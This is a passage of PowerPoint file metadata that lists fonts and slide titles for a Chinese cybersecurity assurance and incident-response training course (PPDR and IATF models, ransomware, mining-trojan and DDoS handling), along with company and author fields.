      <vt:lpstr>方正大黑简体</vt:lpstr>
      <vt:lpstr>仿宋_GB2312</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>楷体_GB2312</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>新宋体</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Black</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>sx272TGp_report_light</vt:lpstr>
      <vt:lpstr>剪辑</vt:lpstr>
      <vt:lpstr>Clip</vt:lpstr>
      <vt:lpstr>Visio.Drawing.11</vt:lpstr>
      <vt:lpstr>Visio</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>课程内容</vt:lpstr>
      <vt:lpstr>课程内容</vt:lpstr>
      <vt:lpstr>课程内容</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障背景</vt:lpstr>
      <vt:lpstr>信息的概念</vt:lpstr>
      <vt:lpstr> 信息的性质</vt:lpstr>
      <vt:lpstr> 课堂思考</vt:lpstr>
      <vt:lpstr>  信息的功能</vt:lpstr>
      <vt:lpstr> 信息与网络空间安全</vt:lpstr>
      <vt:lpstr>网络空间安全的特征与范畴</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障背景</vt:lpstr>
      <vt:lpstr>网络空间安全发展阶段</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>通信安全</vt:lpstr>
      <vt:lpstr>计算机安全</vt:lpstr>
      <vt:lpstr>信息系统安全</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>网络化社会</vt:lpstr>
      <vt:lpstr>信息安全保障</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>网络空间安全</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>网络空间安全/网络空间安全保障（美国概况）</vt:lpstr>
      <vt:lpstr>网络空间安全保障是一种立体保障</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障概念与模型</vt:lpstr>
      <vt:lpstr>网络空间安全保障定义</vt:lpstr>
      <vt:lpstr>与信息安全、安全保障的区别</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障概念与模型</vt:lpstr>
      <vt:lpstr>安全模型的概念</vt:lpstr>
      <vt:lpstr>基于时间的PDR模型</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>基于PDR的安全架构</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PPDR模型-分布式动态主动模型</vt:lpstr>
      <vt:lpstr>PPDR的理解</vt:lpstr>
      <vt:lpstr>PPDR的理解</vt:lpstr>
      <vt:lpstr>PPDR的理解</vt:lpstr>
      <vt:lpstr>PPDR的理解</vt:lpstr>
      <vt:lpstr>PPDR模型中的数学法则</vt:lpstr>
      <vt:lpstr>PPDR模型中的数学法则</vt:lpstr>
      <vt:lpstr>PPDR模型的安全目标</vt:lpstr>
      <vt:lpstr>再看PPDR</vt:lpstr>
      <vt:lpstr>IATF-深度防御保障模型</vt:lpstr>
      <vt:lpstr>何谓“深度防御”？</vt:lpstr>
      <vt:lpstr>IATF框架</vt:lpstr>
      <vt:lpstr>IATF的三要素</vt:lpstr>
      <vt:lpstr>IATF三要素</vt:lpstr>
      <vt:lpstr>IATF的安全需求划分</vt:lpstr>
      <vt:lpstr>技术焦点领域1：保护本地计算环境</vt:lpstr>
      <vt:lpstr>技术焦点领域2：保护区域边界</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>技术焦点领域3：保护网络和基础设施</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>技术焦点领域4：支撑性基础设施建设</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>IATF总体框架</vt:lpstr>
      <vt:lpstr>课堂练习</vt:lpstr>
      <vt:lpstr>知识域：信息系统安全保障概念与模型</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>信息系统安全保障</vt:lpstr>
      <vt:lpstr>信息系统安全保障相关概念和关系</vt:lpstr>
      <vt:lpstr>信息系统安全保障模型</vt:lpstr>
      <vt:lpstr>信息系统安全保障安全特征</vt:lpstr>
      <vt:lpstr>信息系统安全保障生命周期</vt:lpstr>
      <vt:lpstr>信息系统安全保障要素</vt:lpstr>
      <vt:lpstr>课程内容</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障现状</vt:lpstr>
      <vt:lpstr>国外网络空间安全保障体系的最新趋势</vt:lpstr>
      <vt:lpstr>国外网络空间安全保障体系的最新趋势</vt:lpstr>
      <vt:lpstr>美国网络空间安全保障战略：一个轮回 三届政府 四个文件</vt:lpstr>
      <vt:lpstr>美国CNCI：网络“曼哈顿计划”</vt:lpstr>
      <vt:lpstr>美国CNCI：网络“曼哈顿计划”</vt:lpstr>
      <vt:lpstr>美国信息安全保障的重点对象</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>美国网络空间安全保障组织机构</vt:lpstr>
      <vt:lpstr>美国国家网络靶场：新世纪的“曼哈顿”计划</vt:lpstr>
      <vt:lpstr>其他国家网络空间安全保障体系建设动态</vt:lpstr>
      <vt:lpstr>分析总结：重点保护对象</vt:lpstr>
      <vt:lpstr>分析总结：网络空间安全组织机构</vt:lpstr>
      <vt:lpstr>分析总结：基本做法</vt:lpstr>
      <vt:lpstr>我国信息安全保障总体情况</vt:lpstr>
      <vt:lpstr>我国网络空间安全保障工作发展阶段</vt:lpstr>
      <vt:lpstr>我国网络空间安全保障基本思路</vt:lpstr>
      <vt:lpstr>我国网络空间安全保障目标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我国网络空间安全保障体系</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>我国网络空间安全保障体系</vt:lpstr>
      <vt:lpstr>知识域：我国网络空间安全保障工作主要内容</vt:lpstr>
      <vt:lpstr>网络空间安全标准化</vt:lpstr>
      <vt:lpstr>网络空间安全应急处理与信息通报 </vt:lpstr>
      <vt:lpstr>网络空间安全等级保护 </vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>网络空间安全风险评估</vt:lpstr>
      <vt:lpstr>灾难恢复</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障工作方法</vt:lpstr>
      <vt:lpstr>为什么要提取网络空间安全需求</vt:lpstr>
      <vt:lpstr>如何制定网络空间安全保障需求</vt:lpstr>
      <vt:lpstr>安全需求的制定流程</vt:lpstr>
      <vt:lpstr>标准化的安全保障需求文档-ISPP</vt:lpstr>
      <vt:lpstr>规范化保障需求</vt:lpstr>
      <vt:lpstr>课堂练习</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障工作方法</vt:lpstr>
      <vt:lpstr>网络空间安全保障解决方案制定的原则</vt:lpstr>
      <vt:lpstr>规范化、结构化信息系统安全保障方案</vt:lpstr>
      <vt:lpstr>ISST的结构和内容</vt:lpstr>
      <vt:lpstr>课堂练习</vt:lpstr>
      <vt:lpstr>知识域：网络空间安全保障工作方法</vt:lpstr>
      <vt:lpstr>网络空间安全测评</vt:lpstr>
      <vt:lpstr>国家颁布的技术标准</vt:lpstr>
      <vt:lpstr>网络空间安全产品测评</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>信息系统安全保障评估的内容</vt:lpstr>
      <vt:lpstr>信息系统安全测评标准</vt:lpstr>
      <vt:lpstr>网络空间安全人员的知识体系架构</vt:lpstr>
      <vt:lpstr>课程内容</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>1.1 计算机安全事件</vt:lpstr>
      <vt:lpstr>计算机安全事件</vt:lpstr>
      <vt:lpstr>应急响应</vt:lpstr>
      <vt:lpstr>导致安全事件的原因</vt:lpstr>
      <vt:lpstr>应急响应目标</vt:lpstr>
      <vt:lpstr>应急响应意义</vt:lpstr>
      <vt:lpstr>应急响应的能力要求</vt:lpstr>
      <vt:lpstr>应急预案</vt:lpstr>
      <vt:lpstr>应急响应方法</vt:lpstr>
      <vt:lpstr>应急响应上报流程</vt:lpstr>
      <vt:lpstr>应急响应小组分类</vt:lpstr>
      <vt:lpstr>国家级网络安全应急响应组织</vt:lpstr>
      <vt:lpstr>2.事件的分级分类</vt:lpstr>
      <vt:lpstr>事件分类</vt:lpstr>
      <vt:lpstr>事件分类</vt:lpstr>
      <vt:lpstr>事件分级参考</vt:lpstr>
      <vt:lpstr>事件分级参考</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>应急流程</vt:lpstr>
      <vt:lpstr>准备阶段</vt:lpstr>
      <vt:lpstr>检测阶段</vt:lpstr>
      <vt:lpstr>抑制阶段</vt:lpstr>
      <vt:lpstr>根除阶段</vt:lpstr>
      <vt:lpstr>恢复阶段</vt:lpstr>
      <vt:lpstr>跟进阶段</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>常见应急事件</vt:lpstr>
      <vt:lpstr>勒索病毒处置流程</vt:lpstr>
      <vt:lpstr>了解现状</vt:lpstr>
      <vt:lpstr>了解“发病”时间</vt:lpstr>
      <vt:lpstr>了解系统架构</vt:lpstr>
      <vt:lpstr>确认感染者</vt:lpstr>
      <vt:lpstr>感染文件特征和感染时间</vt:lpstr>
      <vt:lpstr>被加密的文件类型</vt:lpstr>
      <vt:lpstr>加密后的文件后缀</vt:lpstr>
      <vt:lpstr>确认感染时间</vt:lpstr>
      <vt:lpstr>处理方式</vt:lpstr>
      <vt:lpstr>处理方式</vt:lpstr>
      <vt:lpstr>处理方式</vt:lpstr>
      <vt:lpstr>DDOS事件处理</vt:lpstr>
      <vt:lpstr>DDOS事件处理</vt:lpstr>
      <vt:lpstr>DDOS事件处理</vt:lpstr>
      <vt:lpstr>DDOS事件处理</vt:lpstr>
      <vt:lpstr>DDOS事件处理</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>勒索病毒家族</vt:lpstr>
      <vt:lpstr>传播方式</vt:lpstr>
      <vt:lpstr>平级单位扩散</vt:lpstr>
      <vt:lpstr>上下级单位扩散</vt:lpstr>
      <vt:lpstr>勒索病毒攻击特点</vt:lpstr>
      <vt:lpstr>勒索病毒事件防御</vt:lpstr>
      <vt:lpstr>挖矿木马处理流程</vt:lpstr>
      <vt:lpstr>了解现状</vt:lpstr>
      <vt:lpstr>了解系统架构</vt:lpstr>
      <vt:lpstr>确认感染者</vt:lpstr>
      <vt:lpstr>处置建议</vt:lpstr>
      <vt:lpstr>防御措施</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例一</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>案例二</vt:lpstr>
      <vt:lpstr>Web入侵案例</vt:lpstr>
      <vt:lpstr>Web入侵案例</vt:lpstr>
      <vt:lpstr>Web入侵案例</vt:lpstr>
      <vt:lpstr>Web入侵案例</vt:lpstr>
      <vt:lpstr>Web入侵案例</vt:lpstr>
      <vt:lpstr>Web入侵案例</vt:lpstr>
      <vt:lpstr>恶意JS案例</vt:lpstr>
      <vt:lpstr>恶意JS案例</vt:lpstr>
      <vt:lpstr>恶意JS案例</vt:lpstr>
      <vt:lpstr>恶意JS案例</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>中国信息安全测评中心:cisp运营中心</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沈传宁</dc:creator>
  <cp:lastModifiedBy>丹阳 郑</cp:lastModifiedBy>
  <cp:revision>874</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2009-02-11T06:13:22Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-22T13:44:11Z</dcterms:modified>
</cp:coreProperties>
</file>